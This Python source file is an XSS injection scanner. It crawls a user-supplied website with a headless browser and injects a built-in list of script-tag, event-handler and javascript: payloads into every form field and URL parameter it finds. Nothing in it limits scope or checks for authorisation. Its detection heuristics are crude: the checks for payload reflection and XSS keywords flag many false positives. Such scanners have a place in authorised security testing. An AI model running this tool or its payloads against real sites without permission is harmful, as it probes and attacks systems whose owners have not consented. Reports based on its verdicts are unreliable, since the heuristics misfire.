import sys
import re
import urllib.parse
from playwright.sync_api import sync_playwright
from urllib.parse import urljoin, urlparse, parse_qs, urlencode

COLORS = {
    "GET": "\033[92m",
    "POST": "\033[94m",
    "PUT": "\033[93m",
    "DELETE": "\033[91m",
    "OTHER": "\033[95m",
    "CYAN": "\033[96m",
    "GRAY": "\033[90m",
    "YELLOW": "\033[93m",
    "RED": "\033[91m",
    "GREEN": "\033[92m",
    "BLUE": "\033[94m",
    "MAGENTA": "\033[95m",
    "RESET": "\033[0m",
    "BOLD": "\033[1m",
    "DIM": "\033[2m",
}

CRITICAL_XSS_PAYLOADS = [
    ("<script>alert(1)</script>", "Script Alert"),
    ("<ScRiPt>alert(1)</ScRiPt>", "Case Insensitive"),
    ("<script>alert(document.domain)</script>", "Domain Alert"),
    ("<script>alert(document.cookie)</script>", "Cookie Alert"),
    ("<img src=x onerror=alert(1)>", "Image Error"),
    ("<img src='x' onerror='alert(1)'>", "Image Error 2"),
    ("<img src=x onerror=prompt(1)>", "Image Prompt"),
    ("<img src=x onerror=confirm(1)>", "Image Confirm"),
    ("<svg/onload=alert(1)>", "SVG Onload"),
    ("<svg><script>alert(1)</script></svg>", "SVG Script"),
    ("<svg><animate onbegin=alert(1)>", "SVG Animate"),
    ("<body onload=alert(1)>", "Body Onload"),
    ("<input onfocus=alert(1) autofocus>", "Input Autofocus"),
    ("<iframe src=javascript:alert(1)>", "Iframe JS"),
    ("<iframe srcdoc='<script>alert(1)</script>'>", "Iframe Srcdoc"),
    ("<a href=javascript:alert(1)>click</a>", "Link JS"),
    ("<form><button formaction=javascript:alert(1)>", "Form Button"),
    ("<details open ontoggle=alert(1)>", "Details Ontoggle"),
    ("<object data=javascript:alert(1)>", "Object Data"),
    ("<embed src=javascript:alert(1)>", "Embed JS"),
    ("<div onclick=alert(1)>Click</div>", "Div Click"),
    ("<b onmouseover=alert(1)>test</b>", "Mouseover"),
    ("<textarea onfocus=alert(1)>", "Textarea Focus"),
]

XSS_PATTERNS = [
    r"<script>.*?alert\s*\(.*?\).*?</script>",
    r"<script>.*?prompt\s*\(.*?\).*?</script>",
    r"<script>.*?confirm\s*\(.*?\).*?</script>",
    r"<script>.*?document\.cookie.*?</script>",
    r"<script>.*?document\.domain.*?</script>",
    r"<img[^>]+onerror\s*=\s*['\"]?\s*alert\s*\(.*?\)\s*['\"]?",
    r"<img[^>]+onerror\s*=\s*['\"]?\s*prompt\s*\(.*?\)\s*['\"]?",
    r"<img[^>]+onerror\s*=\s*['\"]?\s*confirm\s*\(.*?\)\s*['\"]?",
    r"<svg[^>]*onload\s*=\s*['\"]?\s*alert\s*\(.*?\)\s*['\"]?",
    r"<svg[^>]*onload\s*=\s*['\"]?\s*prompt\s*\(.*?\)\s*['\"]?",
    r"<body[^>]*onload\s*=\s*['\"]?\s*alert\s*\(.*?\)\s*['\"]?",
    r"<iframe[^>]*src\s*=\s*['\"]?javascript:\s*alert\s*\(.*?\)\s*['\"]?",
    r"<a[^>]*href\s*=\s*['\"]?javascript:\s*alert\s*\(.*?\)\s*['\"]?",
    r"javascript:\s*alert\s*\(.*?\)",
    r"javascript:\s*prompt\s*\(.*?\)",
    r"javascript:\s*confirm\s*\(.*?\)",
    r"<details[^>]*ontoggle\s*=\s*['\"]?\s*alert\s*\(.*?\)\s*['\"]?",
    r"<object[^>]*data\s*=\s*['\"]?javascript:\s*alert\s*\(.*?\)\s*['\"]?",
    r"<embed[^>]*src\s*=\s*['\"]?javascript:\s*alert\s*\(.*?\)\s*['\"]?",
    r"onerror\s*=\s*['\"]?\s*alert\s*\(.*?\)\s*['\"]?",
    r"onload\s*=\s*['\"]?\s*alert\s*\(.*?\)\s*['\"]?",
    r"onclick\s*=\s*['\"]?\s*alert\s*\(.*?\)\s*['\"]?",
    r"onmouseover\s*=\s*['\"]?\s*alert\s*\(.*?\)\s*['\"]?",
    r"onfocus\s*=\s*['\"]?\s*alert\s*\(.*?\)\s*['\"]?",
    r"ontoggle\s*=\s*['\"]?\s*alert\s*\(.*?\)\s*['\"]?",
    r"onstart\s*=\s*['\"]?\s*alert\s*\(.*?\)\s*['\"]?",
]

IGNORE_PATTERNS = [
    r"404 Not Found",
    r"403 Forbidden",
    r"401 Unauthorized",
    r"500 Internal Server Error",
    r"Page not found",
    r"Invalid input",
    r"Validation error",
    r"CSRF token",
    r"csrf",
    r"token mismatch",
    r"invalid token",
    r"rate limit",
    r"too many requests",
    r"captcha",
    r"reCAPTCHA",
    r"hCaptcha",
    r"Turnstile",
    r"Cloudflare",
    r"Access Denied",
    r"Permission denied",
    r"Unauthorized",
    r"Forbidden",
]


class XSSInjectionCrawler:
    def __init__(self):
        self.discovered_urls = set()
        self.vulnerable_found = []
        self.all_forms = []
        self.all_get_params = []
        self.base_url = ""
        self.total_tests = 0
        self.vulnerable_tests = 0
        self.visited_urls = set()
        self.max_pages = 20
        self.detected_vulnerabilities = set()
        self.fast_mode = True
        self.tested_endpoints = set()

    def print_banner(self):
        banner = f"""
{COLORS['BOLD']}{COLORS['RED']}                 ██╗  ██╗    ███████╗    ███████╗   {COLORS['RESET']}
{COLORS['BOLD']}{COLORS['RED']}                 ╚██╗██╔╝    ██╔════╝    ██╔════╝   {COLORS['RESET']}
{COLORS['BOLD']}{COLORS['RED']}                  ╚███╔╝     ███████╗    ███████╗   {COLORS['RESET']}
{COLORS['BOLD']}{COLORS['RED']}                  ██╔██╗     ╚════██║    ╚════██║   {COLORS['RESET']}
{COLORS['BOLD']}{COLORS['RED']}                 ██╔╝╚██╗    ███████║    ███████║   {COLORS['RESET']}
{COLORS['BOLD']}{COLORS['RED']}                 ╚═╝  ╚═╝    ╚══════╝    ╚══════╝   {COLORS['RESET']}
{COLORS['BOLD']}{COLORS['YELLOW']}                 ✦ XSS INJECTION SCANNER v2.0 ✦{COLORS['RESET']}"""
        print(banner)

    def print_menu(self):
        print(
            f"\n{COLORS['CYAN']}┌─────────────────────────────────────────────────────────────────────────┐{COLORS['RESET']}")
        print(
            f"{COLORS['CYAN']}│{COLORS['RESET']}  {COLORS['BOLD']}📋 SCAN OPTIONS{COLORS['RESET']}                                                        {COLORS['CYAN']}│{COLORS['RESET']}")
        print(
            f"{COLORS['CYAN']}├─────────────────────────────────────────────────────────────────────────┤{COLORS['RESET']}")
        print(
            f"{COLORS['CYAN']}│{COLORS['RESET']}  {COLORS['GREEN']}[1]{COLORS['RESET']}  Quick Scan (Default)                                              {COLORS['CYAN']}│{COLORS['RESET']}")
        print(
            f"{COLORS['CYAN']}│{COLORS['RESET']}  {COLORS['YELLOW']}[2]{COLORS['RESET']}  Deep Scan (More Pages & Payloads)                                 {COLORS['CYAN']}│{COLORS['RESET']}")
        print(
            f"{COLORS['CYAN']}│{COLORS['RESET']}  {COLORS['RED']}[3]{COLORS['RESET']}  Exit                                                              {COLORS['CYAN']}│{COLORS['RESET']}")
        print(
            f"{COLORS['CYAN']}└─────────────────────────────────────────────────────────────────────────┘{COLORS['RESET']}")

    def detect_xss_fast(self, response_text, payload):
        if not response_text:
            return False, "No response", 0

        for pattern in IGNORE_PATTERNS:
            if re.search(pattern, response_text, re.IGNORECASE):
                return False, "Ignored", 0

        clean_payload = re.sub(r'<[^>]+>', '', payload)
        if len(clean_payload) > 3:
            if clean_payload in response_text or payload in response_text:
                return True, "Payload found in response", 95

        for pattern in XSS_PATTERNS:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True, "XSS pattern detected", 90

        return False, "No XSS", 0

    def analyze_response(self, original_response, test_response, payload):
        if not original_response or not test_response:
            return False, "No response"

        if original_response == test_response:
            return False, "No change"

        is_xss, reason, confidence = self.detect_xss_fast(test_response, payload)
        if is_xss:
            return True, f"{reason} (Confidence: {confidence}%)"

        if abs(len(original_response) - len(test_response)) > 100:
            indicators = ['script', 'onerror', 'onload', 'alert', 'prompt', 'confirm', 'javascript']
            if any(i in test_response.lower() for i in indicators):
                return True, f"Response change with XSS indicators"

        return False, "No XSS"

    def get_all_links_fast(self, page):
        links = set()
        try:
            hrefs = page.evaluate("""
                () => {
                    const links = document.querySelectorAll('a[href]');
                    return Array.from(links).map(a => a.href);
                }
            """)
            for href in hrefs:
                if href and not href.startswith(('#', 'javascript:', 'mailto:', 'tel:')):
                    if self.is_same_domain(href):
                        links.add(href)
        except:
            pass
        return links

    def get_all_forms_fast(self, page):
        forms = []
        try:
            forms_data = page.evaluate("""
                () => {
                    const forms = document.querySelectorAll('form');
                    return Array.from(forms).map(form => {
                        const inputs = form.querySelectorAll('input:not([type="hidden"]):not([type="submit"]):not([type="button"])');
                        const textareas = form.querySelectorAll('textarea');
                        return {
                            action: form.action || '',
                            method: form.method || 'get',
                            inputs: Array.from(inputs).map(inp => ({name: inp.name || '', type: inp.type || 'text'})),
                            textareas: Array.from(textareas).map(ta => ({name: ta.name || '', type: 'textarea'}))
                        };
                    });
                }
            """)

            for form_data in forms_data:
                inputs = form_data.get('inputs', []) + form_data.get('textareas', [])
                if inputs:
                    forms.append({
                        'url': form_data.get('action') or page.url,
                        'method': form_data.get('method', 'get').upper(),
                        'action': form_data.get('action', ''),
                        'inputs': inputs
                    })
        except:
            pass
        return forms

    def extract_get_params_fast(self, url):
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if params:
            return {
                'url': url,
                'base_url': f"{parsed.scheme}://{parsed.netloc}{parsed.path}",
                'params': params
            }
        return None

    def is_same_domain(self, url):
        try:
            parsed_base = urlparse(self.base_url)
            parsed_url = urlparse(url)
            return parsed_base.netloc == parsed_url.netloc
        except:
            return False

    def get_endpoint_key(self, url, params=None):
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        if params:
            sorted_params = sorted(params.keys())
            return f"{base}?{'&'.join(sorted_params)}"
        return base

    def discover_pages_fast(self, page):
        print(
            f"\n{COLORS['CYAN']}►{COLORS['RESET']} {COLORS['BOLD']}Discovering pages and endpoints...{COLORS['RESET']}")

        links = self.get_all_links_fast(page)
        print(f"{COLORS['GRAY']}   ↳ Found {len(links)} unique links{COLORS['RESET']}")

        if page.url not in self.discovered_urls:
            self.discovered_urls.add(page.url)

        for link in links:
            if link not in self.discovered_urls:
                self.discovered_urls.add(link)
                params = self.extract_get_params_fast(link)
                if params:
                    self.all_get_params.append(params)

        forms = self.get_all_forms_fast(page)
        print(f"{COLORS['GRAY']}   ↳ Found {len(forms)} forms{COLORS['RESET']}")
        self.all_forms.extend(forms)

        return list(self.discovered_urls)

    def crawl_pages_fast(self, context):
        print(f"\n{COLORS['CYAN']}►{COLORS['RESET']} {COLORS['BOLD']}Crawling discovered pages...{COLORS['RESET']}")

        pages_to_visit = list(self.discovered_urls)[:self.max_pages]
        total_pages = len(pages_to_visit)

        for idx, url in enumerate(pages_to_visit, 1):
            if url in self.visited_urls:
                continue

            print(f"{COLORS['GRAY']}   [{idx}/{total_pages}] Visiting: {url[:60]}...{COLORS['RESET']}", end=" ",
                  flush=True)

            try:
                page = context.new_page()
                page.goto(url, timeout=10000, wait_until="domcontentloaded")
                self.visited_urls.add(url)

                forms = self.get_all_forms_fast(page)
                if forms:
                    self.all_forms.extend(forms)
                    print(f"{COLORS['GREEN']}✓ Found {len(forms)} forms{COLORS['RESET']}")
                else:
                    print(f"{COLORS['DIM']}✓ No forms{COLORS['RESET']}")

                links = self.get_all_links_fast(page)
                for link in links:
                    if link not in self.discovered_urls:
                        self.discovered_urls.add(link)
                        params = self.extract_get_params_fast(link)
                        if params:
                            self.all_get_params.append(params)

                page.close()

            except Exception as e:
                print(f"{COLORS['YELLOW']}⚠ Error{COLORS['RESET']}")
                continue

        print(f"\n{COLORS['GREEN']}✓{COLORS['RESET']} Crawled {len(self.visited_urls)} pages")
        print(f"{COLORS['GREEN']}✓{COLORS['RESET']} Found {len(self.all_forms)} forms")
        print(f"{COLORS['GREEN']}✓{COLORS['RESET']} Found {len(self.all_get_params)} GET parameters")

    def get_response_fast(self, url, data=None, method='POST', context=None):
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Connection': 'keep-alive',
            }

            if method == 'POST':
                headers['Content-Type'] = 'application/x-www-form-urlencoded'
                response = context.request.post(url, headers=headers, data=data, timeout=8000)
            else:
                response = context.request.get(url, headers=headers, timeout=8000)

            return response.text()
        except:
            return None

    def test_critical_payloads(self, context, is_deep=False):
        print(
            f"\n{COLORS['CYAN']}►{COLORS['RESET']} {COLORS['BOLD']}Testing critical XSS payloads...{COLORS['RESET']}\n")

        if is_deep:
            max_params_per_endpoint = 5
            max_payloads_per_test = len(CRITICAL_XSS_PAYLOADS)
            max_endpoints = len(self.all_get_params)
        else:
            max_params_per_endpoint = 3
            max_payloads_per_test = 8
            max_endpoints = 15

        for param_data in self.all_get_params[:max_endpoints]:
            url = param_data['url']
            base_url = param_data['base_url']
            params = param_data['params']

            endpoint_key = self.get_endpoint_key(base_url, params)

            if endpoint_key in self.tested_endpoints:
                print(f"{COLORS['DIM']}   ⏭ Skipping already tested endpoint: {base_url}{COLORS['RESET']}")
                continue

            self.tested_endpoints.add(endpoint_key)

            original_data = {}
            for key, values in params.items():
                if values:
                    original_data[key] = values[0]

            if not original_data:
                continue

            original_url = f"{base_url}?{urlencode(original_data)}"
            original_response = self.get_response_fast(original_url, method='GET', context=context)

            if not original_response:
                continue

            print(f"\n{COLORS['BLUE']}━━━ Testing: {base_url}{COLORS['RESET']}")

            params_to_test = list(original_data.keys())[:max_params_per_endpoint]

            for param_key in params_to_test:
                payloads_to_test = CRITICAL_XSS_PAYLOADS[:max_payloads_per_test] if not is_deep else CRITICAL_XSS_PAYLOADS

                for payload, payload_name in payloads_to_test:
                    test_params = original_data.copy()
                    test_params[param_key] = f"{original_data[param_key]}{payload}"
                    test_url = f"{base_url}?{urlencode(test_params)}"

                    print(
                        f"{COLORS['GRAY']}   Testing: {COLORS['YELLOW']}{payload_name}{COLORS['RESET']} on {COLORS['MAGENTA']}{param_key}{COLORS['RESET']}",
                        end=" ", flush=True)

                    test_response = self.get_response_fast(test_url, method='GET', context=context)
                    if not test_response:
                        print(f"{COLORS['YELLOW']}⚠ No response{COLORS['RESET']}")
                        continue

                    self.total_tests += 1
                    is_vulnerable, reason = self.analyze_response(original_response, test_response, payload)

                    if is_vulnerable and test_url not in self.detected_vulnerabilities:
                        self.vulnerable_tests += 1
                        self.detected_vulnerabilities.add(test_url)
                        print(f"{COLORS['RED']}⚠ VULNERABLE!{COLORS['RESET']}")
                        print(f"{COLORS['DIM']}      → {reason}{COLORS['RESET']}")

                        self.vulnerable_found.append({
                            'url': test_url,
                            'payload': payload,
                            'payload_name': payload_name,
                            'parameter': param_key,
                            'reason': reason,
                        })
                    else:
                        print(f"{COLORS['GREEN']}✓ Safe{COLORS['RESET']}")

    def test_forms_fast(self, context, is_deep=False):
        print(f"\n{COLORS['CYAN']}►{COLORS['RESET']} {COLORS['BOLD']}Testing forms for XSS...{COLORS['RESET']}\n")

        forms_to_test = [f for f in self.all_forms if f['method'] == 'POST']

        if is_deep:
            forms_to_test = forms_to_test[:20]
        else:
            forms_to_test = forms_to_test[:10]

        for form_data in forms_to_test:
            url = form_data['url']
            inputs = form_data['inputs']

            endpoint_key = self.get_endpoint_key(url)

            if endpoint_key in self.tested_endpoints:
                print(f"{COLORS['DIM']}   ⏭ Skipping already tested form: {url[:60]}{COLORS['RESET']}")
                continue

            if not inputs:
                continue

            self.tested_endpoints.add(endpoint_key)

            test_data = {}
            for inp in inputs:
                name = inp.get('name')
                if name:
                    name_lower = name.lower()
                    if 'email' in name_lower or 'mail' in name_lower:
                        test_data[name] = 'test@example.com'
                    elif 'password' in name_lower or 'pass' in name_lower:
                        test_data[name] = 'testpass123'
                    elif 'search' in name_lower or 'q' in name_lower:
                        test_data[name] = 'test'
                    else:
                        test_data[name] = 'test_input'

            if not test_data:
                continue

            original_data = urllib.parse.urlencode(test_data)
            original_response = self.get_response_fast(url, original_data, 'POST', context)

            if not original_response:
                continue

            print(f"\n{COLORS['BLUE']}━━━ Testing Form: {url[:60]}{COLORS['RESET']}")

            payloads_to_test = CRITICAL_XSS_PAYLOADS[:6] if not is_deep else CRITICAL_XSS_PAYLOADS

            for payload, payload_name in payloads_to_test:
                modified_data = test_data.copy()
                first_key = list(test_data.keys())[0]
                modified_data[first_key] = f"{test_data[first_key]}{payload}"
                test_data_str = urllib.parse.urlencode(modified_data)

                print(f"{COLORS['GRAY']}   Testing: {COLORS['YELLOW']}{payload_name}{COLORS['RESET']}", end=" ",
                      flush=True)

                test_response = self.get_response_fast(url, test_data_str, 'POST', context)
                if not test_response:
                    print(f"{COLORS['YELLOW']}⚠ No response{COLORS['RESET']}")
                    continue

                self.total_tests += 1
                is_vulnerable, reason = self.analyze_response(original_response, test_response, payload)

                if is_vulnerable and url not in self.detected_vulnerabilities:
                    self.vulnerable_tests += 1
                    self.detected_vulnerabilities.add(url)
                    print(f"{COLORS['RED']}⚠ VULNERABLE!{COLORS['RESET']}")
                    print(f"{COLORS['DIM']}      → {reason}{COLORS['RESET']}")

                    self.vulnerable_found.append({
                        'url': url,
                        'payload': payload,
                        'payload_name': payload_name,
                        'reason': reason,
                    })
                else:
                    print(f"{COLORS['GREEN']}✓ Safe{COLORS['RESET']}")

    def print_results(self):
        print(f"\n{COLORS['CYAN']}╔══════════════════════════════════════════════════════════════╗{COLORS['RESET']}")
        print(
            f"{COLORS['CYAN']}║{COLORS['RESET']} {COLORS['BOLD']}📊 SCAN COMPLETED{COLORS['RESET']}                                                    {COLORS['CYAN']}║{COLORS['RESET']}")
        print(
            f"{COLORS['CYAN']}║{COLORS['RESET']}                                                                         {COLORS['CYAN']}║{COLORS['RESET']}")
        print(
            f"{COLORS['CYAN']}║{COLORS['RESET']}   {COLORS['DIM']}📄 Pages Discovered:{COLORS['RESET']} {COLORS['YELLOW']}{len(self.discovered_urls)}{COLORS['RESET']}                                              {COLORS['CYAN']}║{COLORS['RESET']}")
        print(
            f"{COLORS['CYAN']}║{COLORS['RESET']}   {COLORS['DIM']}🔗 GET Parameters:{COLORS['RESET']} {COLORS['YELLOW']}{len(self.all_get_params)}{COLORS['RESET']}                                              {COLORS['CYAN']}║{COLORS['RESET']}")
        print(
            f"{COLORS['CYAN']}║{COLORS['RESET']}   {COLORS['DIM']}📝 Forms Found:{COLORS['RESET']} {COLORS['YELLOW']}{len(self.all_forms)}{COLORS['RESET']}                                                    {COLORS['CYAN']}║{COLORS['RESET']}")
        print(
            f"{COLORS['CYAN']}║{COLORS['RESET']}   {COLORS['DIM']}🧪 Tests Performed:{COLORS['RESET']} {COLORS['YELLOW']}{self.total_tests}{COLORS['RESET']}                                                {COLORS['CYAN']}║{COLORS['RESET']}")
        print(
            f"{COLORS['CYAN']}║{COLORS['RESET']}   {COLORS['DIM']}⚠ Vulnerabilities:{COLORS['RESET']} {COLORS['RED']}{self.vulnerable_tests}{COLORS['RESET']}                                                   {COLORS['CYAN']}║{COLORS['RESET']}")
        print(
            f"{COLORS['CYAN']}║{COLORS['RESET']}                                                                         {COLORS['CYAN']}║{COLORS['RESET']}")

        if self.vulnerable_found:
            print(
                f"{COLORS['CYAN']}║{COLORS['RESET']} {COLORS['RED']}⚠ {COLORS['BOLD']}VULNERABLE ENDPOINTS:{COLORS['RESET']}                                          {COLORS['CYAN']}║{COLORS['RESET']}")
            for idx, vuln in enumerate(self.vulnerable_found[:5], 1):
                print(
                    f"{COLORS['CYAN']}║{COLORS['RESET']}   {COLORS['RED']}{idx}.{COLORS['RESET']} {COLORS['YELLOW']}{vuln['url'][:55]}{'...' if len(vuln['url']) > 55 else ''}{COLORS['RESET']}        {COLORS['CYAN']}║{COLORS['RESET']}")
                print(
                    f"{COLORS['CYAN']}║{COLORS['RESET']}      {COLORS['DIM']}Payload:{COLORS['RESET']} {COLORS['MAGENTA']}{vuln['payload'][:35]}{'...' if len(vuln['payload']) > 35 else ''}{COLORS['RESET']}                     {COLORS['CYAN']}║{COLORS['RESET']}")
        else:
            print(
                f"{COLORS['CYAN']}║{COLORS['RESET']} {COLORS['GREEN']}✓ No XSS Vulnerabilities Found{COLORS['RESET']}                                   {COLORS['CYAN']}║{COLORS['RESET']}")

        print(f"{COLORS['CYAN']}╚══════════════════════════════════════════════════════════════╝{COLORS['RESET']}")

    def run_scan(self, target_url, scan_type="quick"):
        self.base_url = target_url
        self.tested_endpoints = set()
        is_deep = scan_type == "deep"

        if is_deep:
            self.max_pages = 50
            print(
                f"\n{COLORS['YELLOW']}⚠ {COLORS['BOLD']}Deep Scan Mode Enabled{COLORS['RESET']}")
            print(f"{COLORS['YELLOW']}⚠ {COLORS['BOLD']}Testing all payloads on each endpoint {COLORS['RESET']}")

        print(f"\n{COLORS['CYAN']}╔══════════════════════════════════════════════════════════════╗{COLORS['RESET']}")
        print(
            f"{COLORS['CYAN']}║{COLORS['RESET']} {COLORS['BOLD']}🔍 Starting XSS Injection Scan   {COLORS['RESET']}                            {COLORS['CYAN']}║{COLORS['RESET']}")
        print(
            f"{COLORS['CYAN']}║{COLORS['RESET']} {COLORS['DIM']}   Target: {target_url[:50]}{'...' if len(target_url) > 50 else ''}{COLORS['RESET']}{' ' * (45 - len(target_url[:50]))}{COLORS['CYAN']}║{COLORS['RESET']}")
        print(f"{COLORS['CYAN']}╚══════════════════════════════════════════════════════════════╝{COLORS['RESET']}")

        with sync_playwright() as p:
            print(f"\n{COLORS['CYAN']}►{COLORS['RESET']} Initializing browser...")
            browser = p.chromium.launch(headless=True)
            context = browser.new_context()
            page = context.new_page()

            print(f"{COLORS['CYAN']}►{COLORS['RESET']} Loading target: {COLORS['YELLOW']}{target_url}{COLORS['RESET']}")

            try:
                page.goto(target_url, timeout=20000)
                page.wait_for_load_state("domcontentloaded", timeout=5000)
            except:
                print(f"{COLORS['YELLOW']}⚠ Quick load{COLORS['RESET']}")

            self.discover_pages_fast(page)
            self.crawl_pages_fast(context)

            self.test_forms_fast(context, is_deep)
            self.test_critical_payloads(context, is_deep)

            self.print_results()
            browser.close()

        return self.vulnerable_found

    def main(self):
        self.print_banner()

        while True:
            self.print_menu()
            print()

            choice = input(
                f"{COLORS['BOLD']}└──> {COLORS['RESET']}{COLORS['GREEN']}Select option :{COLORS['RESET']}").strip()

            if choice == "3":
                print(f"\n{COLORS['YELLOW']}⚠ Exiting...{COLORS['RESET']}")
                sys.exit(0)

            url = input(
                f"{COLORS['BOLD']}└──> {COLORS['RESET']}{COLORS['CYAN']}Enter target URL : {COLORS['RESET']}").strip()
            if not url.startswith("http"):
                url = "https://" + url

            if choice == "1":
                self.run_scan(url, "quick")
                print(f"\n{COLORS['DIM']}Press Enter to continue...{COLORS['RESET']}")
                try:
                    input()
                except KeyboardInterrupt:
                    print(f"\n{COLORS['YELLOW']}⚠ Exiting...{COLORS['RESET']}")
                    sys.exit(0)
            elif choice == "2":
                self.run_scan(url, "deep")
                print(f"\n{COLORS['GREEN']}✓ Deep scan completed. Exiting automatically...{COLORS['RESET']}")
                sys.exit(0)
            else:
                print(f"{COLORS['RED']}✗ Invalid option!{COLORS['RESET']}")
                continue


if __name__ == "__main__":
    crawler = XSSInjectionCrawler()
    crawler.main()